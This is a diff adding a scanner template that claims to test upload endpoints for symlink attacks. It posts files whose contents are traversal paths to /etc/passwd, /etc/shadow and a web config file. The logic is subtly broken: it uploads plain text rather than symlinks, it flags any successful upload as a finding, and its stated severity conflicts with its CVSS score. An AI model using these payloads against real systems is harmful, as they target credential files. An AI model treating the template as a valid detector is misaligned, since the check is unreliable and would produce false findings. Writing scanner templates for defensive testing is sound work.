@@ -1,0 +1,94 @@
+id: medium-upload-symlink-attack-file-system
+
+info:
+  name: File Upload - Symlink Attack for File System Access
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects file upload vulnerabilities that allow symlink attacks to access sensitive files.
+    This template tests uploading symlinks that can point to critical system files.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
+    cvss-score: 7.1
+    cwe-id: CWE-59
+  tags: fileupload,symlink,file-system,access
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="passwd.txt"
+        Content-Type: text/plain
+        
+        ../../../etc/passwd
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="shadow.txt"
+        Content-Type: text/plain
+        
+        ../../../etc/shadow
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="config.txt"
+        Content-Type: text/plain
+        
+        ../../../var/www/html/config.php
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    payloads:
+      path:
+        - "{{BaseURL}}/upload"
+        - "{{BaseURL}}/upload.php"
+        - "{{BaseURL}}/fileupload"
+        - "{{BaseURL}}/file/upload"
+        - "{{BaseURL}}/admin/upload"
+        - "{{BaseURL}}/user/upload"
+
+    attack: pitchfork
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+      - type: word
+        words:
+          - "upload"
+          - "success"
+          - "file"
+          - "saved"
+          - "uploaded"
+        condition: or
+        case-insensitive: true
+
+      - type: word
+        words:
+          - "error"
+          - "failed"
+          - "invalid"
+          - "not allowed"
+          - "forbidden"
+        condition: or
+        case-insensitive: true
+        negative: true
